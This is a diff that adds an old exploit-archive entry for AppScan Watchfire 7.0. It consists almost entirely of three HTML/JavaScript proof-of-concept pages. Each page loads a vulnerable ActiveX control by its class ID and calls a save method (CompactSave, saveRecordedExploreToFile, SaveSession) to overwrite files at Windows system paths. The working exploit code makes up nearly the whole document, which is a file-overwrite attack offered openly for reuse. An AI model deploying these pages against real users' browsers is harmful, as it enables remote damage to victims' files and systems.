@@ -1,0 +1,54 @@
+****************************************************************************************************************
+Multiple Insecure Methods in AppScan Watchfire Web Application Security v 7.0
+Remote: Yes
+An arbitrary file overwrite has been discovered in an ActiveX control installed with the WatchFire Appscan v 7.0.
+by callAX -> Fr33d0m & Kn0wl3dg3 1s th3 r341 P0w3r
+****************************************************************************************************************
+ 
+
+<HTML>
+ <object id=ctrl classid="clsid:{E302E486-D748-475C-84F3-4F7ED6F78EC5}"></object>
+<SCRIPT>
+function Do_it()
+ {
+   File = "c:\\autoexec_.bat"
+   ctrl.CompactSave(File)
+ }
+</SCRIPT>
+<input language=JavaScript onclick=Do_it() type=button value="Proof of
+Concept">
+</BODY>
+</HTML>
+ 
+<HTML>
+<BODY>
+ <object id=ctrl classid="clsid:{AA9730F1-70F6-43DC-94FC-000000000004}"></object>
+<SCRIPT>
+function Do_it()
+ {
+   File = "c:\\boot_.ini"
+   ctrl.saveRecordedExploreToFile(File)
+ }
+</SCRIPT>
+<input language=JavaScript onclick=Do_it() type=button value="Proof of
+Concept">
+</BODY>
+</HTML>
+ 
+
+<HTML>
+<BODY>
+ <object id=ctrl classid="clsid:{E302E486-D748-475C-84F3-4F7ED6F78EC5}"></object>
+<SCRIPT>
+function Do_it()
+ {
+   File = "c:\\ntldr_"
+   ctrl.SaveSession(File)
+ }
+</SCRIPT>
+<input language=JavaScript onclick=Do_it() type=button value="Proof of
+Concept">
+</BODY>
+</HTML>
+
+# milw0rm.com [2008-04-25]
